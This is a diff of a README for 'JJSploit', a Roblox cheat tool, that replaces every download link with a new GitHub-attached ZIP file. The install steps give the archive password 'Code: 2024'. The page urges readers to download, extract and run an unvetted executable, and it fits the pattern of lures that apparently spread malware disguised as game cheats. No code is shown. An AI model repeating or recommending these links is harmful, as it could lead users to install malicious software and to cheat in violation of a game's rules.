@@ -1,10 +1,10 @@
-# JJSploit [![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-blueviolet)](https://github.com/user-attachments/files/17178475/JJsploit_64x.zip)
+# JJSploit [![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-blueviolet)](https://github.com/user-attachments/files/17226599/JJSploit_Release.zip)
 
 
 ## Installation
 To install JJSploit, follow these simple steps:
 1. Download the JJSploit package from here
-    [![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-blueviolet)](https://github.com/user-attachments/files/17178475/JJsploit_64x.zip)
+    [![Download JJSploit](https://img.shields.io/badge/Download-JJSploit-blueviolet)](https://github.com/user-attachments/files/17226599/JJSploit_Release.zip)
 2. **Code: 2024**
 
 3. Extract the downloaded ZIP file to your desired location on your system.
@@ -40,7 +40,7 @@ Once you have installed JJSploit, you can start using it to enhance your Roblox 
 ## Contributing
 We actively encourage contributions from the Roblox community to help us improve JJSploit. Whether you have suggestions, bug reports, or wish to contribute directly to the development of JJSploit for Roblox, we welcome your input. Feel free to submit a pull request—your involvement is essential in making JJSploit even better for all Roblox users!
 
-[![361017071-00b6407a-f962-452d-a474-14962df4fbc7](https://github.com/user-attachments/assets/76cdd4f7-352a-496f-8d64-35dd8b37a17e)](https://github.com/user-attachments/files/17178475/JJsploit_64x.zip)
+[![361017071-00b6407a-f962-452d-a474-14962df4fbc7](https://github.com/user-attachments/assets/76cdd4f7-352a-496f-8d64-35dd8b37a17e)](https://github.com/user-attachments/files/17226599/JJSploit_Release.zip)
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
